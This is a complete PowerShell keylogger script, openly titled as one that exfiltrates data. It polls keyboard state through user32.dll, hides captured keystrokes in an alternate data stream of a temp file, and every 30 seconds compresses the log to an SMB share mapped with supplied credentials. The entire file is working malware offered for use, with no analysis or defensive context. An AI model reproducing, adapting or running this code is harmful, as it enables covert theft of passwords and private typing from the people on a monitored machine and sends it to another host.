# Powershell Keylogger that exfiltrates data 
# Creates a file in the users temp directory and logs keys to the stream
# Every 30 seconds, data is sent to an SMB share of the user's choice.
#
# By: Michael Cosmadelis

function Start-KeyLogger()
{
  # Signatures for API Calls
  $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
    
    $share = Read-Host -Prompt "Enter SMB share path: "
    $creds = Get-Credential
    New-PSDrive -Name P -PSProvider FileSystem -Root $share -Credential $creds -Persist

    # load signatures and make members available
    $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
    $Path = "$env:temp\file.txt"
    # create output file stream     
    echo "Leave me" > $Path
    $createStream = Set-Content -Path $Path -Stream secret.txt ""
    
  try {

    $timer = New-Object Timers.Timer
    ## Now setup the Timer instance to fire events
    $timer.Interval = 30000     # fire every 30s
    $timer.AutoReset = $true  # do not enable the event again after its been fired
    $timer.Enabled = $true
    # Specifies the commands that will execute. It zips the log file
    # and with the destination of the zip as the SMB share.
    Register-ObjectEvent -InputObject $timer -EventName Elapsed -SourceIdentifier Exfil -Action {
        Compress-Archive -Path $Path -DestinationPath "P:\exfil.zip" 
    } > null
    
    while ($true) {
      
      Start-Sleep -Milliseconds 40

      # scan all ASCII codes above 8                                                                                   
      for ($ascii = 9; $ascii -le 254; $ascii++) {
        # get current key state
        $state = $API::GetAsyncKeyState($ascii)
        
        # is key pressed?
        if ($state -eq -32767) {
          $null = [console]::CapsLock

          # translate scan code to real code
          $virtualKey = $API::MapVirtualKey($ascii, 3)

          # get keyboard state for virtual keys
          $kbstate = New-Object Byte[] 256
          $checkkbstate = $API::GetKeyboardState($kbstate)

          # prepare a StringBuilder to receive input key
          $mychar = New-Object -TypeName System.Text.StringBuilder

          # translate virtual key
          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
          
          if ($success) {
            # add key press to file stream
            Add-Content -Path $Path -Stream secret.txt $mychar -NoNewline | Set-Content -Encoding Unicode -NoNewline 
          }
        }
      }
    }
  }
  finally {
  }
}
Start-KeyLogger